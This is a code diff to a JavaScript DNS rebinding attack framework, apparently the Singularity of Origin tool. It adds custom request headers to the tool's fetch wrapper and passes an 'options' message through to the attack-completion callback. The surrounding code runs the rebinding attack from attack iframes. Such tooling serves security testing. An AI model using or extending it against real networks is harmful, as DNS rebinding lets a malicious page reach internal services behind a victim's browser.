@@ -1,7 +1,18 @@
 // Wrap `fetch()` API, so we can invoke it:
 // from the attack iframe (fetch attack method)
 // or from the child iframe of the attack iframe (iframe attack method)
+// Custom headers will be applied to all fetch calls
+let customHeaders = {};
 let sooFetch = function (resource, options) {
+    // Merge custom headers with existing headers
+    if (Object.keys(customHeaders).length > 0) {
+        options = options || {};
+        options.headers = options.headers || {};
+        // Apply custom headers
+        for (const [key, value] of Object.entries(customHeaders)) {
+            options.headers[key] = value;
+        }
+    }
     return fetch(resource, options)
 };
 
@@ -19,6 +30,7 @@ const Rebinder = () => {
     let interval = 60000;
     let wsproxyport = 3129;
     let rebindingSuccess = false;
+    let options = { headers: {}, config: {} };
 
     const rebindingStatusEl = document.getElementById('rebindingstatus');
 
@@ -38,6 +50,11 @@ const Rebinder = () => {
                     break;
                 case 'wsproxyport':
                     wsproxyport = e.data.param;
+                    break;
+                case 'options':
+                    options = e.data.param || { headers: {}, config: {} };
+                    customHeaders = options.headers || {};
+                    console.log('Received options:', options);
                     break;
                 case 'flushdns':
                     if (e.data.param.flushDns === true) {
@@ -157,7 +174,7 @@ const Rebinder = () => {
                 // Terminate the attack
                 rebindingSuccess = true;
                 rebindingStatusEl.innerText = `DNS rebinding successful! (HTTP ${responseData.status})`;
-                rebindingDoneFn(payload, headers, cookie, body, wsproxyport);
+                rebindingDoneFn(payload, headers, cookie, body, wsproxyport, options);
             })
             .catch(function (error) {
                 if (error instanceof TypeError) { // We cannot establish an HTTP connection
